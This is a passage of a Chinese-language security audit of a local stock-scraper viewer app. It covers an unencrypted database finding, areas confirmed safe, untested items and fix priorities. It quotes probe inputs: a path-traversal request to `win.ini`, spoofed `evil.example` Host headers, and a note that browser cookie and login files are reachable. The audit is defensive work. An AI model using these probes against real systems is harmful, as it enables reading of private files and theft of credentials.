                   "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:")
  ```

  `_send_file` 的 MIME 改为**白名单字典**（扩展名 → MIME），未命中一律 `application/octet-stream`（并配合 P0-1 的扩展名白名单，双重收敛）。

---

### P3-5 ｜ 本地数据库无加密，且含全量原始页面 HTML

- **位置**：`viewer/db.py:19`（`DB_PATH = .../app.db`）、`viewer/db.py:717-723`（`save_raw_pages`）
- **类型**：CWE-311 缺少敏感数据加密
- **现象与证据**：`app.db` 为明文 SQLite（实测经穿越可读，`Content-Length: 917504`，文件头 `SQLite format 3\0`）；`raw_pages` 表存"每次抓取的完整原始页面 HTML"（含登录态页面的 HTML）。登录状态详情本身**已做脱敏**（`ingest.py:107/113` 只写状态与 URL，**不写 Cookie 值**，`set_login_status` 只落 `detail` 文本），这一点是好的。
- **影响**：任何能读到该文件的路径（P0-1、备份、误提交）都会拿到全量数据；登录态页面的原始 HTML 可能夹带个人信息。
- **建议修法**：文件系统层用 EFS/BitLocker 或 `sqlcipher`（需换驱动，成本较高）；低成本缓解是**缩短 `raw_pages` 保留期**并在写入前对 HTML 做一次"去除 Set-Cookie / token 字段"的清洗。

---

### 附：等级汇总

| 等级 | 条数 | 编号 |
| --- | --- | --- |
| P0 | 1 | P0-1 |
| P1 | 2 | P1-1、P1-2 |
| P2 | 4 | P2-1、P2-2、P2-3、P2-4 |
| P3 | 5 | P3-1、P3-2、P3-3、P3-4、P3-5 |
| 合计 | **12** | — |

---

## 三、已确认安全的部分

> 以下均经代码核对 / 只读实测确认**不存在**问题，避免"全是洞"的误判。

1. **SQL 注入：未发现可注入路径（结论明确：不可注入）**
   - `viewer/db.py` 全部 `execute` / `executemany` / `executescript` 均使用 `?` 占位符或 `:name` 命名参数（如 `db.py:361-379`、`604-615`、`718-721`、`748-758`、`840-858`、`1029` 等），**没有一处把来自 URL 的字符串拼进 SQL**。
   - `viewer/server.py` 中所有来自 URL／query 的值（`symbol`、`name`、`kind`、`id`、`limit`、`min_holders`、`full`）都走参数绑定：`server.py:384-397`、`463-475`、`512-529`、`604-607`。
   - `api_players`（`server.py:337-352`）虽为动态拼 SQL，但**拼入的片段全部是代码内字面量**（`"channel=?"`、`"tier=?"`、`"is_top_player=1"`），值仍走 `params`；`channel` / `tier` 不可能改变 SQL 结构。
   - 全仓 grep 仅命中 6 处 f-string SQL（`db.py:301/310/326/345/988`、`demo_data.py:277`），**插值对象全是内部常量**（表名/列名来自硬编码元组，`counts()` 的 `t` 为内部固定字符串，`demo_data` 同理），**外部不可控**。`tools/refresh_and_verify.py:45` 属独立脚本且同为内部常量。
   - `api_consensus` 的 `min_holders` 只在 Python 层比较 `len(holders) < min_holders`，不入 SQL。

2. **无硬编码密钥 / 明文口令入库**
   - `config/overseas_sources.yaml:77-78`、`401` 使用的 YouTube / GitHub 凭据均为**环境变量**（`api_key_env: YOUTUBE_API_KEY`、`token_env: GITHUB_TOKEN`），字段值为空串；`config/sites.yaml:34-35` 只有表单字段名。全仓 grep 未发现真实 `sk-*`、`Bearer`、手机号、明文密码。
   - 项目根**不存在** `credentials.yaml`（只有 `credentials.example.yaml`，占位符 `"YOUR_PASSWORD"`）。
   - 凭据本身以 **Fernet 密文**存于 `~/.workbuddy/stock-scraper-creds/credentials.enc`（`credentials.py:26-58`），**不在项目目录内**（`credentials.py:17` 的设计意图正确）。
   - `credentials.describe()`（`credentials.py:142-152`）**只回显 `has_password` 与用户名，不回显密码与 Cookie 值**（脱敏正确）。

3. **登录态详情不泄露凭据**：`ingest.py:107/113/116` 写入 `login_status.detail` 的只有"校验结果 + 探测 URL + HTTP 状态码"，**不含 Cookie / 密码**；`/api/login_status`（`server.py:609-610`）回流给前端的内容因此是安全的。

4. **服务仅监听本机回环地址（重要缓解因素，已给确切行号）**
   - `viewer/server.py:695` → `srv = ThreadingHTTPServer(("127.0.0.1", PORT), Handler)`
   - `viewer/launch.py:42` → `srv = server.ThreadingHTTPServer(("127.0.0.1", server.PORT), server.Handler)`
   - **两处均为 `127.0.0.1`，不是 `0.0.0.0`** → 同局域网设备**无法**直接访问，风险等级**不上调**。（这也是 P0-1 虽为任意文件读取、但定级 P0 而非 "P0+远程" 的原因：前置条件是需要本机代码执行或绕过浏览器策略。）

5. **主抓取链路 TLS 校验正常**：`scraper/session.py:43` 使用 `requests.Session()`（默认 `verify=True`，无任何 `verify=False`）；P2-4 的降级**仅限 `overseas/sources.py` 一处**。

6. **合规与防误导设计到位**：`scraper/session.py:60-83` 尊重 `robots.txt`；`viewer/compliance.py` 做公开内容过滤；`ingest.py:260/272` 的入库前均过 `filter_public_only`。前端 `srcLink()`（`app.js:315-332`）对示例/占位域名（`example.local`、`127.0.0.1` 等）**主动降级为不可点击文本 + "示例"标记**，并对非 `http(s)` 协议一律不生成 `<a>`（**恰好把 `javascript:` 伪协议挡住了**），有效防钓鱼与防误导。

7. **错误页不泄露 traceback**：404/400 均为标准库简洁页面（实测 330 B / 417 B），未回显异常栈或绝对路径；`log_message` 被静默（`server.py:689-690`）。

8. **写接口串行化**：`_WRITE_LOCK`（`server.py:18-20,634`）+ WAL（`db.py:40-41`）避免了写锁冲突，是正确的工程实践（同时也限制了 CSRF 的并发破坏力）。

9. **单实例启动器逻辑正确**：`desktop_app.py:75-79` 先持互斥体再起服务、`_port_in_use()` 复用已在监听的端口，避免了历史上"窗口越开越多 / 多后端抢端口"的问题（其可绕过点见 P3-3，属加固项）。

---

## 四、未验证项与原因

| 编号 | 未验证项 | 原因 |
| --- | --- | --- |
| V1 | 5 个写接口的**实弹 CSRF 触发**（浏览器/form 提交后接口确实执行） | 只读约束：**不得真的调用写接口**。结论为代码级论证（`server.py:632-687` 未读取任何来源头 / 未校验 Content-Type / 解析失败静默降级为 `{}`）；已在 `[C]` 段留下核对表。 |
| V2 | XSS 的浏览器实弹验证 | 需先向 `app.db` 写入含 `"` 的恶意昵称（属写操作）。结论基于 `esc()` 实现（`app.js:19-21`）与 `innerHTML` 拼接点（`app.js:248/344/834/909/331`）的静态推导。 |
| V3 | Chrome Private Network Access 是否拦截"公网页面 → `http://127.0.0.1:8765`"的跨源 fetch | 需真实浏览器 + 可控站点做对照实验。因此 P1-1 / P1-2 的**远程可利用性**存在环境依赖，已如实标注为缓解因素。 |
| V4 | Chrome `Cookies` 库 / `Login Data` 的解密 | 属凭据解密，明确不执行；仅确认文件**可经 P0-1 读取**（状态码 200 与字节数），未取任何内容。 |
| V5 | `.key` / `credentials.enc` 的实际内容与 ACL | ① 在 C: 盘，**不能**经 P0-1 读取（已实测跨盘符 404）；② 属凭据，不读取。P2-3 结论基于 `os.chmod` 在 Windows 上的语义（只影响只读位、不设 ACL）与 `except OSError: pass` 的静默处理。 |
| V6 | `.browser-profile` 中是否已存在**已登录**的 tgb.cn 会话 Cookie | 未解密 Cookie 库。仅记录了 `tools/_cookies_latest.json`（明文导出）含 tgb.cn 域 cookie，说明该目录确有登录态采集链路。 |
| V7 | DNS rebinding 端到端利用 | 需可控域名与本地 DNS 服务。已实测** Host 头完全不校验**（`Host: evil.example` / `attacker.local` / 空值均 200），前置条件成立。 |
| V8 | 跨盘符（C:）任意文件读取 | 已实测 `/static/../C:/Windows/win.ini` → 404，结论为**同盘符内**可达（代码级原因：`pathlib` 无法用 `..` 跨盘符；拼接绝对路径会破坏 `startswith` 判据）。 |
| V9 | 非 ASCII / 含空格文件名的读取 | 已实测：空格 → 400 Bad request syntax；百分号编码不被解码 → 404（见 P0-1 结论 4 的附带限制）。 |
| V10 | 并发压测 / 写锁饥饿 | 属性能与稳定性范畴，不在本次安全专项范围内，且需发起写请求（被只读约束禁止）。 |

---

## 五、修复优先级建议（供团队排序，不含任何代码改动）

1. **立即（P0-1）**：`_send_file` 判据改 `Path.resolve()` + `is_relative_to()`，静态分支加扩展名白名单与 `..` 拒绝。这是唯一一条"一行判据即可被本机任意进程利用读走整库与 Cookie"的问题。
2. **本轮（P1-1 / P1-2）**：去掉无条件 `ACAO: *`，写接口加 Origin/Host/Content-Type 校验，JSON 解析失败改 400 而非静默 `{}`。
3. **紧随（P2-1 / P2-2）**：`esc()` 补 `"` 与 `'`（一处改动覆盖全部 7 个属性上下文调用点）；新增 `.gitignore` 并迁移/清理 `tools/` 下的明文 Cookie 与 DB 备份。
4. **加固（P2-3 / P2-4 / P3-\*）**：Windows ACL、海外源恢复 TLS 校验、统一安全响应头、参数解析兜底、MIME 白名单、`Global\` 互斥体。
